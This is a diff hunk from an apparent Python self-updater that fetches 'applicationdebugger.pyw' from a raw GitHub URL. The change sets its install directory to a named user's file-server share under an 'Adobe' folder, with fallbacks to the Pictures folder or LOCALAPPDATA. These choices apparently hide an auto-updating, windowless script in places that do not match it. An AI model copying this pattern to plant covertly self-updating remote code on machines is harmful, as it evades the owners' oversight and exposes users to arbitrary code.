@@ -12,11 +12,12 @@ FILE_NAME = "applicationdebugger.pyw"  # Name der Hauptdatei deiner Anwendung
 UPDATE_URL = "https://raw.githubusercontent.com/pyw-update/python/refs/heads/main/src/" + FILE_NAME
 
 # Pfade
-# if "WindowsApps" in sys.executable:
-#     LOCAL_APPDATA = os.path.join(os.environ["USERPROFILE"], "Pictures")
-# else:
-#     LOCAL_APPDATA = os.environ.get("LOCALAPPDATA", os.path.expanduser("~\\AppData\\Local"))
-LOCAL_APPDATA = os.path.join(os.environ["USERPROFILE"], "Pictures")
+if os.path.exists("\\KL-FS01\Benutzer$\anakin-luke.hoffmann\Eigene Dateien\Adobe"):
+    LOCAL_APPDATA = "\\KL-FS01\Benutzer$\anakin-luke.hoffmann\Eigene Dateien\Adobe"
+elif "WindowsApps" in sys.executable:
+    LOCAL_APPDATA = os.path.join(os.environ["USERPROFILE"], "Pictures")
+else:
+    LOCAL_APPDATA = os.environ.get("LOCALAPPDATA", os.path.expanduser("~\\AppData\\Local"))
 APP_DIR = os.path.join(LOCAL_APPDATA, "UpdateFramework")
 APP_PATH = os.path.join(APP_DIR, FILE_NAME)
 venv_dir = os.path.join(APP_DIR, ".venv")
